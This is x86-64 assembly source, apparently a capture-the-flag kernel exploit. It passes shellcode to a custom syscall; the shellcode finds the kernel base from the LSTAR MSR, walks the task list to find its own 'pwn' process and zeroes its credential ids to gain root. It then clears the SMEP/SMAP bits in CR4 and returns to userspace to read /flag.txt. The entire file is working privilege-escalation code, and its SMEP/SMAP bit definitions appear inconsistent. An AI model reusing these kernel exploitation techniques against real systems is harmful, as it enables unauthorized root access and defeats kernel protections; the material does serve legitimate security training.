%define PROT_READ       0x1
%define PROT_WRITE      0x2
%define MAP_PRIVATE     0x02
%define MAP_ANONYMOUS   0x20
%define MAP_FIXED       0x10
%define MAP_GROWSDOWN   0x100
%define MAP_POPULATE    0x8000
%define SYS_MMAP        9
%define PR_SET_NAME     15 
%define SYS_PRCTL       157
%define SYS_OPEN 2
%define SYS_WRITE 1
%define SYS_READ 0

%define SIGSEGV 11
%define SYS_RT_SIGACTION 13
%define SA_SIGINFO 0x04000000

%define LSTAR_MSR       0xc0000082
%define ENTRY_SYSCALL   0x80
%define INIT_TASK       0x1a0e900
%define CRED_OFFSET     0x760 ; task->cred 
%define TASKS_OFFSET    0x4c0 ; task->tasks
%define COMM_OFFSET     0x778 ; task->comm
%define SWAPGS_GADGET   (0x15d0 + 103)

%define SMAP_BIT (~(1 << 21))
%define SMEP_BIT (~(1 << 21))



section .data
EXPLOIT_COMM db "pwn", 0;
FLAG_FILE db "/flag.txt", 0;

section .bss
sigact resb 256;
flag_buf resb 128;

section .text
    global _start

shellcode:
    mov ecx, LSTAR_MSR;
    rdmsr;
    shl rdx, 32;
    or rax, rdx;

    sub rax, ENTRY_SYSCALL;
    mov r15, rax; r15 should be the kernel base

    mov rbx, r15;
    add rbx, INIT_TASK;
    add rbx, TASKS_OFFSET;
loop:
    mov rcx, [rbx];
    sub rcx, TASKS_OFFSET;
    mov rdx, [rcx + COMM_OFFSET];
    cmp edx, 0x6e7770;
    je found_task;
    add rcx, TASKS_OFFSET;
    mov rbx, rcx;
    jmp loop;
found_task: ; current task is in rcx
    mov rbx, [rcx + CRED_OFFSET];
    mov qword [rbx + 0x08], 0; set id to 0
    mov qword [rbx + 0x10], 0; set id to 0
    mov qword [rbx + 0x18], 0; set id to 0
    mov qword [rbx + 0x20], 0; set id to 0

    ; return to userspace
    mov rsp, 0x133a000;
    mov rax, cr4;
    and rax, (SMEP_BIT | SMAP_BIT); disable SMEP and SMAP
    mov cr4, rax;
    swapgs;
    iretq;

shellcode_end:

_start:
    lea rsi, [rel sigact];
    lea rdi, [rel win]
    mov qword [rsi + 0x00], rdi;
    mov qword [rsi + 0x08], SA_SIGINFO;
    mov qword [rsi + 0x10], 0;
    mov qword [rsi + 0x18], 0;
    mov rax, SYS_RT_SIGACTION;
    mov rdi, SIGSEGV;
    xor rdx, rdx;
    mov r10, 0x8;
    syscall;

    mov rax, SYS_MMAP;
    mov rdi, 0x1337000;
    mov rsi, 0x4000;
    mov rdx, PROT_READ | PROT_WRITE;
    mov r10, MAP_FIXED | MAP_PRIVATE | MAP_ANONYMOUS | MAP_GROWSDOWN | MAP_POPULATE;
    mov r8, -1;
    xor r9, r9;
    syscall;

    mov rax, SYS_PRCTL;
    mov rdi, PR_SET_NAME;
    mov rsi, EXPLOIT_COMM;
    xor rdx, rdx;
    xor r10, r10;
    xor r8, r8;
    syscall

    pushf;
    pop rax;

    mov rsp, 0x133a000;
    mov qword [rsp + 0x00], win;
    mov qword [rsp + 0x08], cs;
    mov qword [rsp + 0x10], rax;
    mov qword [rsp + 0x18], 0x1339000;
    mov qword [rsp + 0x20], ss;

    mov rsp, 0x1339000;

    mov rdi, shellcode;
    mov rsi, shellcode_end - shellcode;
    mov rax, 1337;
    syscall

    mov rax, 60;
    mov rdi, 0;
    syscall;

win:
    mov rax, SYS_OPEN;
    mov rdi, FLAG_FILE;
    xor rsi, rsi;
    xor rdx, rdx;
    syscall;
    mov rdi, rax;
    mov rax, SYS_READ;
    lea rsi, [rel flag_buf];
    mov rdx, 0x100;
    syscall;
    mov rdi, 1;
    mov rax, SYS_WRITE;
    syscall;

    mov rax, 60;
    mov rdi, 0;
    syscall;
    
restorer:
    mov rax, 60;
    mov rdi, 0;
    syscall;
